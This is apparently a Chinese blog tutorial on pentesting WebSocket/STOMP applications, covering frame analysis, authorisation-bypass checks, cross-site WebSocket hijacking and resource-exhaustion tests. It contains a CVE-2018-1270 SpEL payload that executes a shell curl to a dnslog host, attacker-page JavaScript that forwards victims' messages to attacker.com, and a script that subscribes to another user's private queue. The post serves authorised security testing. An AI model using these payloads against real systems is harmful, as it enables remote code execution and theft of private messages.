#  拉开渗透差距：从被忽略的细节入手，WebSocket 漏洞测试实操  
原创 白白c
                    白白c  网安前线   2026-04-27 00:01  
  
**0****1**  
  
  
  
**前言**  
  
  
AI时代发展得越来越快，上周受邀回到母校和很多师弟师妹做了一次安全技术交流，发现大家都有一个共同的困惑：现在漏洞越来越难测了，简单的漏洞几乎找不到，感觉安全这条路越走越窄，甚至有些迷茫，不知道该往哪个方向努力，甚至有同学吐槽  
**“入门即瓶颈”**  
。  
  
  
其实我也认真思考过这个问题，确实，现在渗透测试的门槛越来越高，特别是出现一些AI自动化渗透工具，基础和常见漏洞基本都能被快速发现，对于初级人员基本很难挖到漏洞。但这也让整个渗透行业出现了两极分化：对于初级人员来说，**越来越难入门、难提高，想靠基础操作站稳脚跟越来越难**  
；而对于中高级人员来说，反而越来越有利，行业竞争越来越卷，大家的产出效率也越来越高。说到底，那些一眼就能发现的简单漏洞，早就被开发者和AI工具修复得差不多了，想靠基础操作产出成果，确实越来越难。  
  
  
我认为，想要在渗透测试行业站稳脚跟，和别人形成核心竞争力，关键不在于找那些人人都能找到的简单漏洞，而在于从别人忽略、不知道的地方下手。**你能挖出别人挖不出来的“漏洞”，你就比别人更强**  
，这就是差距所在，也是初级人员突破瓶颈、中高级人员拉开差距的关键。  
  
  
那怎么才能拉开渗透测试的产出差距呢？答案就在一些容易被忽略的细节里，比如我们今天要重点分享的WebSocket。很多新手甚至老渗透，都会跳过这个点，觉得它复杂、看不懂，但其实这里面藏着大量别人挖不到的漏洞，也是目前很多项目的安全盲区。  
  
  
**0****2**  
  
  
  
**WebSocket 是什么，为什么值得测**  
  
  
普通的网页请求（HTTP），就像你打外卖电话，你说“要一份外卖”，商家说“好的，马上送”，说完电话就挂了，想再点一份，就得重新拨号；而**WebSocket，就像你和朋友开微信视频通话**  
，一旦接通，你们俩能随时说话、发表情包，不用每次都重新打，一直连着，实时沟通。  
  
正因为它能“一直连着、实时通信”，现在很多网页、APP都用它做这些功能：微信网页版的消息推送、企业微信的审批提醒、在线文档的实时协作、游戏里的实时状态同步，甚至是直播的弹幕互动，背后都有WebSocket的影子。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3voTJqpicKFPw6GxaSyUa5op58ITvOoz8ibbqdsPkIRCkicu9J42pctLAV3YjvFtXrxwR1wicJic5tVkTkPn4iburLjYRRJ1IYQveRHQXRFJmY0P8/640?wx_fmt=png&from=appmsg "")  
  
至于为啥要测它，记3点就够了，直白又好记，看完就知道它有多重要：  
  
**1.  它传的都是“正经业务数据”**  
：不像有些请求只传无关紧要的内容，WebSocket里全是核心信息，比如你的用户ID、待办任务ID、私聊消息、审批内容，这些都是漏洞的关键，挖到就是“硬货”。  
  
**2.  开发人员不重视它的安全**  
：大家都习惯给普通接口做防护，比如登录校验、权限控制，但对WebSocket的防护经常马马虎虎，甚至完全不做，觉得“没人会测这个”。  
  
**3.  它很隐蔽，容易被忽略**  
：Burp 默认抓的是 HTTP，WebSocket 帧需要单独去 WebSockets history 看，很多新手甚至老渗透，都会直接跳过，漏洞就这么被藏了起来。  
  
**03**  
  
  
  
**必懂名词**  
  
  
         
 后面会反复提到几个词，所以得先知道知道它是干啥的，我用粗一点的话给大家解释一下  
。  
  
WebSocket握手  
：就是“建立视频通话”的过程——你（客户端，比如你的浏览器）给网页服务器发个请求，说“我要建立长连接”，服务器同意了，就返回“101”状态码，相当于“接通了”。在Burp里看到“101”，就说明长连接建好了，可以开始收发消息了。  
  
STOMP  
：简单说，就是  
WebSocket  
的“聊天规则”。  
WebSocket  
只负责“接通通话”，不管你发的消息格式对不对、该发给谁；  
STOMP  
就规定了一套“规矩”，告诉你该怎么发指令，服务器才能听懂——比如“我要订阅消息”“我要发消息给某人”。很多Java做的网页（尤其是Spring框架），都用这个规则，也是我们今天重点讲的内容。  
  
SockJS  
：一个“兼容工具”，相当于“桥梁”。有些老服务器不支持  
WebSocket  
，  
SockJS  
就帮忙搭桥，让老服务器也能用上长连接。识别它很简单：看抓包记录里，有没有  
“/info  
”这个请求，或者有没有像  
“/ws/abc123/websocket”  
这种带乱码（随机字符）的路径，有就是用了SockJS。  
  
CONNECT/CONNECTED  
：  
STOMP  
的“打招呼”指令。你发  
“CONNECT  
”，相当于对服务器说“我要进聊天群”；服务器回“  
CONNECTED  
”，就是“欢迎进群，以后可以说话、看消息了”，这一步完成，才算真正能开始订阅、收发消息。  
  
SUBSCRIBE  
：“订阅消息”的指令。相当于你对服务器说“我要关注这个群（消息队列），有新消息记得推给我”。里面的“  
destination  
”，就是群地址，比如  
“/queue/private/10086  
”，后面的一串数字，一般就是你的用户ID，相当于“你的专属私人群”。  
  
MESSAGE  
：服务器推给你的“群消息”，里面才是真正有用的业务内容——比如谁给你发了私聊、有什么审批提醒、任务状态变了，这些都在  
MESSAGE  
帧里。  
  
SEND  
：你主动发给服务器的“消息”，相当于你在群里发言、操作业务——比如“确认审批”“发送私聊消息”“修改任务状态”，这些实际的操作，都是通过  
SEND  
帧完成的，也是最容易出漏洞的地方之一。  
  
**0****4**  
  
  
  
**先分清，你遇到的是哪种WebSocket？**  
  
  
WebSocket  
就两种情况，一眼就能分清，差别很大，测法也不一样  
### 1.第一种：纯WebSocket（简单版，少见）  
  
很直接，抓包时能明显看到请求头里有“Upgrade: websocket”，没有多余的请求，直接就建立长连接，相当于“直接打通视频通话，不用试探”。这种情况比较少见，测试起来也最简单，直接看帧内容就行。  
  
裸 WebSocket   
升级一步到位，握手里的 Upgrade: websocket  
 很清晰。  
### 2.第二种：SockJS + STOMP（常见版，Java网页多）  
  
SockJS  
 不一样，它在建立真正的 WebSocket 连接之前会先发一个 HTTP 探测请求，路径通常是 /xxx/info  
，返回的是 JSON，比如：  
```
{"entropy":123456,"origins":["*:*"],"cookie_needed":false,"websocket":true}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3voTJqpicKFOBjGLXFgibJiayO0JQvXKpJBnKQYdTtDQy0TFFiazVJOweBENxv02OByKo7AZBibbwqOAv7FgQKicD6cibgIvcoMNvkCAcnJE7tM5PQ/640?wx_fmt=png&from=appmsg "")  
  
这张图里有两个值得注意的地方：响应里 cookie_needed: true  
 说明服务端靠 Cookie 绑定 session，WebSocket 升级时会直接复用；请求里的 Admin-Token  
 就是被复用的鉴权凭据，后面测订阅边界时换账号要带对应的 Token。  
  
然后才是实际的连接请求，路径格式一般像 /xxx/abc123/websocket  
，中间那段是随机 session ID。  
  
为什么这个细节值得注意？因为 SockJS 本身的 session 管理有时候没做好，不同账号的 session 路径如果可以枚举或预测，就有额外的测试空间。而且 SockJS 下的 STOMP 帧会多一层封装，你看到的原始内容会是带方括号的字符串，比如：  
```
a["CONNECTED\nversion:1.2\nheart-beat:0,0\n\n\u0000"]
```  
  
这里的 \u0000  
 就是 STOMP 帧结束符，实际是一个 \0  
 字节。用工具手动构造帧的时候如果忘了加这个，服务端直接不响应，很容易误判成"不通"，实际上只是帧格式不对。  
  
下面这张是 Burp Suite WebSocket history 里抓到的真实 CONNECT 帧，可以直观看到 SockJS 的包裹格式——最外层是方括号和引号，帧内换行用 \n  
 转义，末尾是 \u0000  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3voTJqpicKFMBgAX7BV2e2ElTuFxLpFGksCSTBsgGjgB0NficiaibGPzEokCDcVDibzPFEU8J3fibwDj0wypoibSxewhQzs8uNd1BD9wvqGhILaQOA/640?wx_fmt=jpeg&from=appmsg "")  
  
路径 /m/ws/267/qcyfu1nx/websocket  
 里的 267  
 是服务端分配的 session 前缀，qcyfu1nx  
 是随机 session ID，这个格式是 SockJS 的标准路径结构。  
  
**0****5**  
  
  
  
**CONNECT 帧,别只看一眼就过**  
  
抓到CONNECT  
帧（就是你给服务器“打招呼”的指令），新手很容易直接跳过，觉得“只要连接成功就行”，其实这里有两个简单的测试点，顺手就能测，不用复杂操作：  
  
STOMP 握手里的 CONNECT  
 帧通常长这样：  
```
CONNECTaccept-version:1.2,1.1,1.0heart-beat:10000,10000
```  
  
有几个地方可以顺手看一下。  
  
**第一个是 heart-beat。**  
 这两个数字代表"客户端能发送的最小间隔"和"客户端希望接收的最小间隔"，单位毫秒。这个字段本身通常没什么漏洞，但可以用来判断服务端实现——如果你把这个值改成 0,0  
，或者改成一个极端值，看服务端怎么响应，有时候能侧面了解框架和版本信息。  
  
**第二个是鉴权方式。**  
 STOMP 规范里 CONNECT  
 帧支持 login  
 和 passcode  
 两个 header，部分系统确实会用这两个字段做认证，这种情况下就要看这两个值是否可以爆破或者绕过。更常见的情况是系统依赖 HTTP session 做鉴权，WebSocket 升级时直接复用了 Cookie，STOMP 帧里根本没有鉴权信息——这种实现方式的风险点在后面，主要反映在订阅边界上，而不是 CONNECT 这一步。  
  
服务端返回 CONNECTED  
 说明 STOMP 层握手完成，这时候才真正开始进入有意思的部分。  
  
**0****6**  
  
  
  
**SUBSCRIBE 帧,漏洞高发区**  
  
  
SUBSCRIBE  
帧，就是“订阅消息”的指令，比如这样：  
```
SUBSCRIBEid:sub-0destination:/queue/private/20250226193841000202
```  
  
出现这个，说明这条长连接已经不只是"连上了"，而是客户端开始参与具体的消息分发。  
  
/queue/private/...  
 这类路径一般和用户、会话、对象或任务实例有关，比纯广播队列更值得分析，因为它直接指向权限和隔离逻辑。  
  
下面是抓到的真实 SUBSCRIBE 帧，注意 destination  
 末尾那串数字——这就是后面分析推送边界时最关键的标识符：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3voTJqpicKFO5x65mm0BkXuuhGeoH0f1C6E9ETlqn93EJ5Hj4xu0aMg276IcoG3pOQHuZnOymia4evvZD9nMtyQnJ8PgOA9JOHktw6rZgFgho/640?wx_fmt=jpeg&from=appmsg "")  
  
同样可以看到 SockJS 封装格式和 \u0000  
 结尾，和上面 CONNECT 帧的结构一致。  
  
这时候有几件事要做。  
  
记下 destination  
 的完整值，后面那串标识别丢，很多系统就是靠这部分来区分用户或会话。  
  
同时观察当前页面订阅了几个目标。有些页面背后会同时订阅通知、待办、状态刷新等多个 destination  
，这些最好一次性记全。  
  
最重要的一步：**主动触发业务动作，然后回来看帧**  
。如果只是停在那等，你可能只看到 CONNECT  
 和 SUBSCRIBE  
，看不到真正有内容的 MESSAGE  
。回到页面里做点操作——打开通知、提交一次表单、切换模块——然后再盯这条连接，大部分的有效内容都是这么触发出来的。  
  
**0****7**  
  
  
  
**拿到MESSAGE帧，怎么判断有没有漏洞？**  
  
MESSAGE  
帧就是服务器推给你的“群消息”，里面有真正的业务数据，不用看复杂的内容，重点看3个地方  
1. 消息里有没有“用户ID”“任务ID”“租户ID”这类数字（比如userId=123、taskId=456）；  
  
1. 这些数字，是不是你当前登录账号的（比如你登录的是账号A，消息里的userId却是账号B的，或者taskId是别人的任务ID）；  
  
1. 消息内容，是不是你该看的（比如你是普通用户，却看到了管理员的审批消息、别人的私聊内容）。  
  
只要出现“不是你该看的内容”，比如看到别人的任务、别人的私聊、管理员的消息，就说明有越权漏洞，值得继续深挖，  
**这就是别人挖不到、你能挖到的“漏洞”。**  
  
优先看这些内容：destination  
、subscription  
、帧头里的 message-id  
，以及 body 里的业务字段，比如 userId  
、roomId  
、taskId  
、tenantId  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3voTJqpicKFNgXmMuJCmg7iacwAZXvJ3nQ0CNcSaOZhichQ7HUicVw8neCEWAQOianiaukmLUBYtZOJMRDKiciaEnp4libztooqGcjPlj7fTOV78xicZE/640?wx_fmt=png&from=appmsg "")  
  
**08**  
  
  
  
**拿到SEND帧，别放过！**  
  
  
SEND  
帧，就是你主动发给服务器的“消息”，相当于你在群里发言，但它比发言更重要——很多时候，它能直接操作业务，比如确认审批、修改任务状态、发送私聊消息，这类帧的漏洞，往往是高危漏洞。  
  
看SEND帧，就看两个地方，很简单，不用复杂分析：  
1. destination  
：你把消息发给了哪个“群”（哪个接口），比如发给“/app/approve”，可能就是确认审批的接口；  
  
1. body里的内容：有没有“任务ID”“状态”“用户ID”这类字段（比如taskId=123  
、status=“已完成  
”、userId=456  
）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3voTJqpicKFPK0jfsoicm2dd0ForlxwTbIO1kZHCA5fgqUoz5ULpsh1QvM9wO6xaM8aylLx37jgj0a9Y6Sp5ONDaMkPUXdD6v4UKKqehe4micg/640?wx_fmt=png&from=appmsg "")  
  
重点判断：这个SEND  
帧，是“只是告诉服务器你做了什么”（比如“我点开了通知”，不影响业务），还是“真的能改变业务”（比如“把任务改成已完成”“确认审批”“删除别人的任务”）。  
  
如果是后者，可以试试，改一改body里的数字（比如把taskId=123  
改成taskId=456  
，把userId=自己的改成别人的  
），然后重发这个帧，看能不能操作别人的业务——**能的话，就是严重的高危漏洞，也是拉开你和别人差距的关键。**  
  
**0****9**  
  
  
  
**Spring网页的一个经典漏洞**  
  
  
如果目标是 Spring 生态的项目（Spring WebSocket + STOMP + Spring Messaging），有一  
个历史漏洞一定要测  
：**CVE-2018-1270**  
  
Spring Messaging 在处理 STOMP 帧里的 selector  
 header 时，直接把这个值当成 SpEL（Spring Expression Language）表达式去求值，没有做任何过滤。攻击者可以在 SUBSCRIBE  
 帧里带上：  
```
SUBSCRIBE
id:sub-0
destination:/topic/greetings
selector:T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'sh','-c','curl http://$(whoami).x.dnslog.cn'})
```  
  
或者更直接地用 SpEL 执行命令并回显。影响版本是 Spring Framework 5.0.x < 5.0.5 和 4.3.x < 4.3.16，2018 年已经修复。  
  
实际测试时，看到 Spring Boot 项目就可以顺手确认一下版本，或者在 SUBSCRIBE  
 帧里加一个 selector  
 header 看服务端有没有异常响应。现在的项目大多已经升级，但老系统或者内网遗留项目里还是会遇到。  
  
**0****10**  
  
  
  
**工具怎么用**  
  
### 1. 抓包：用Burp（最基础）  
  
打开Burp，正常抓包，然后找到“WebSockets history”  
，里面就是所有的帧（CONNECT、SUBSCRIBE、MESSAGE、SEND  
这些），能直接看内容、改内容、重发。  
  
如果是SockJS  
的帧，看起来会乱一点（带方括号、引号），别慌，正常改里面的内容就行，比如改destination  
后面的地址、body里的数字，改完重发就好。  
### 2. 手动连接：用两个简单命令（测连接通不通）  
  
如果想手动连接服务器，测试长连接通不通，用这两个命令，先装Node.js，装完就能用：  
```
# 第一个：wscat（简单，新手首选）
npm install -g wscat  # 安装（复制粘贴到命令行，回车就行）
wscat -c "ws://目标网页地址/ws/123abc/websocket"  # 连接（把“目标网页地址”换成你测的地址）
# 第二个：websocat（更稳定，推荐）
websocat ws://目标网页地址/ws/123abc/websocket  # 直接连接（不用安装，复制粘贴就能用）
```  
  
连接成功后，会显示“connected”，说明长连接通了，可以手动发帧测试；如果连接失败，说明路径错了，或者服务器有防护。  
### 3. 批量测越权：用脚本  
  
手动换账号、换“群地址”测试，太麻烦，效率太低，新手可以用脚本，全程复制粘贴，只改3个地方，就能批量测越权（比如用A账号，订阅B账号的私人群，看能不能收到消息）。  
  
第一步：安装依赖（复制粘贴到命令行，回车就行）：  
```
npm install @stomp/stompjs ws
```  
  
  
第二步：复制下面的脚本，粘贴到记事本，保存为“test.js”（比如保存到桌面）：  
```
const { Client } = require("@stomp/stompjs");
const WebSocket = require("ws");
// 只改下面3行，改完保存就行
const WS_URL = "ws://目标网页地址/ws/123abc/websocket";  // 换成你测的长连接地址（从Burp里复制）
const AUTH_TOKEN = "Bearer eyJ...";  // 换成A账号的Token（你登录的账号，从Burp里复制）
const TARGET_DEST = "/queue/private/20250226193841000202";  // 换成B账号的“群地址”（别人的私人群，从Burp里复制）
const client = new Client({
webSocketFactory: () => new WebSocket(WS_URL, {
headers: {
Cookie: "session=xxxxx",  // 换成A账号的Cookie（从Burp里复制）
Authorization: AUTH_TOKEN,
},
}),
onConnect: () => {
console.log("[+] 连接成功了，开始订阅别人的私人群...");
// 用A账号，订阅B账号的私人群，测试越权
client.subscribe(TARGET_DEST, (message) => {
console.log("[!] 收到消息了！有越权漏洞！");
console.log("消息头：", message.headers);
console.log("消息内容：", message.body);
});
console.log(`[*] 已经订阅了 ${TARGET_DEST}，等着收消息...`);
},
onStompError: (frame) => {
console.log("[-] 报错了:", frame.headers["message"]);
},
onDisconnect: () => {
console.log("[-] 连接断开了");
},
});
client.activate();
```  
  
打开命令行，进入桌面（输入cd 桌面，回车），然后输入“node test.js”，回车运行。  
  
看3种结果就够了：  
1. 显示“收到消息了！有越权漏洞！”：恭喜，找到越权漏洞了，这就是别人挖不到的“硬货”；  
  
1. 显示“报错了: Unauthorized”：有防护，但可以看看报错信息，有没有泄露有用的地址（比如别人的群地址）；  
  
1. 直接显示“连接断开了”：防护做得好，在建立连接时就拦住你了，换个思路，测其他点。  
  
换账号测的时候只需要改 AUTH_TOKEN  
 和 Cookie，TARGET_DEST  
 保持 B 账号的值不变，对比两次响应差异就很清晰。  
  
**0****11**  
  
  
  
**握手层的鉴权**  
  
  
很多人默认"WebSocket 升级时带了 Cookie 就安全了"，但握手这一步本身有几个值得测的点，不只是看 101  
 就过。  
  
**Origin 检测。**  
 浏览器发 WebSocket 请求时会自动带上 Origin  
 头，部分服务端拿这个值做跨域校验。用 Burp 拦截握手请求，把 Origin  
 改成一个不相关的域名，比如 https://xxx.com  
，看服务端是否还返回 101  
：  
```
GET /ws/info HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: https://xxx.com
```  
  
如果仍然返回 101  
，说明没有做 Origin 校验。这个时候配合 Cookie 鉴权就有 CSWSH（Cross-Site WebSocket Hijacking）的空间——攻击者在自己控制的页面里建一条连接，浏览器会自动带上 target.com 的 Cookie，之后订阅受害者的 private queue，实时接收推送内容：  
```
// 攻击者页面里的代码
const ws = new WebSocket("wss://target.com/ws/abc/websocket");
ws.onmessage = (e) => {
  fetch("https://attacker.com/log?d=" + encodeURIComponent(e.data));
};
```  
  
判断能不能利用还要看 Cookie 有没有带 SameSite=Strict  
 或 Lax  
，有的话浏览器层面会阻止跨站请求携带 Cookie，利用难度大幅上升。  
  
**Token 放在 URL 里。**  
 部分应用把鉴权 token 直接拼在 WebSocket 连接 URL 里：  
```
wss://target.com/ws?token=eyJhbGci...这种方式的问题是 URL 会出现在服务端日志、代理日志、Referer 头里，token 容易被旁路泄露。遇到这种情况，记录下来，顺手确认 token 的有效期和使用次数有没有限制。
```  
  
**0****12**  
  
  
  
**连接和资源限制**  
  
  
WebSocket  
是“长连接”，服务器要一直维护这个连接，如果维护得不好，很容易被消耗资源（比如让服务器崩溃），这也是一个测试点，新手了解即可，测之前一定要告诉甲方（不然可能违法，涉及破坏计算机系统）：  
1. 测试连接数：快速建立很多条长连接（比如用脚本批量建），看服务器从第几条开始拒绝，没有任何限制的话，说明缺少基本的保护；  
  
1. 测试订阅数：在一条连接里，反复订阅很多个“群”（比如用脚本循环订阅），正常情况应该有上限，没有上限的话，服务器内存会越用越多，甚至崩溃；  
  
1. 测试超时：把CONNECT  
帧的heart-beat  
改成“0,0”（关掉心跳），建立连接后啥也不做，看服务器多久会主动断开，能无限保持连接的话，容易消耗服务器资源；  
  
1. 测试超大消息：发一个很大的消息（比如10MB，用脚本发），看服务器有没有大小限制，会不会崩溃、影响其他连接的正常使用  
  
**0****13**  
  
  
  
**哪些情况说明有戏，哪些暂时可以放一放**  
  
  
**值得继续挖的（有漏洞大概率，重点看）：**  
1. 收到了不是你该看的消息（比如别人的私聊、别人的待办、管理员的消息）；  
  
1. 换了“群地址”，还能收到有效消息（比如换成别人的用户ID，还能收到消息）；  
  
1. 用SEND帧，操作了别人的业务（比如改别人的任务、确认别人的审批）；  
  
1. 不同账号的“私人群”串线（比如你能收到别人的消息，别人也能收到你的消息）；  
  
1. Origin测试能通过（改Origin还能返回101），且Cookie没有“SameSite”保护。  
  
### 可以先放一放的（大概率没漏洞，别浪费时间）：  
1. 只建立了长连接，但没收到任何MESSAGE、SEND帧（说明这个长连接没用到核心业务）；  
  
1. 换了“群地址”，服务器立刻断开连接（说明防护做得好，权限隔离很严）；  
  
1. 不同账号的消息隔离得很好，看不到别人的任何内容；  
  
1. 发异常内容后，服务器只是正常断开，没泄露任何信息（比如错误日志、服务器版本）。  
  
这种情况记下来，先测其他地方，等看完别的业务点，再回头结合着看就行，不用死盯。  
  
**总结**  
  
  
按下面10步来，就能把WebSocket（STOMP）测透，突破入门瓶颈：  
1. 先看Burp里有没有“101”响应，确认长连接建立成功；  
  
1. 分清是“纯WebSocket”还是“SockJS+STOMP”（看有没有“/info”请求，有就是后者）；  
  
1. 测握手层：改Origin字段，看有没有跨域漏洞；查Token是不是在URL里，有就是泄露风险；  
  
1. 确认STOMP握手成功（服务器返回CONNECTED），顺便改改heart-beat，看服务器反应；  
  
1. 记全所有SUBSCRIBE帧的“群地址”（destination），一个都别漏；  
  
1. 主动操作网页，触发MESSAGE帧，看有没有越权内容（别人的消息、别人的任务）；  
  
1. 找SEND帧，改改里面的参数（比如taskId、userId），看能不能操作别人的业务；  
  
1. 如果是Spring网页，测一下CVE-2018-1270漏洞，老项目很容易遇到；  
  
1. 换“群地址”、改消息参数，测订阅越权，这是漏洞高发区；  
  
1. （可选）在甲方同意的情况下，测资源限制漏洞（连接数、订阅数等）。  
  
**END**  
  
  
AI时代，渗透测试的核心竞争力，从来不在于找人人都能找到的简单漏洞，而在于跳出固有思维，挖掘那些被大多数人忽略的技术盲区与细节。WebSocket只是其中一个典型代表——除了它，还有诸多易被跳过的测试场景，而这些被忽视的角落，恰恰是拉开不同人之间差距的关键。  
  
**点击下方名片进入公众号**  
  
**公众号专注于传递网安价值、普及知识、分享实战经验，分感悟、实践两类等，每周一篇，敬请关注。**  
  
  
  
  
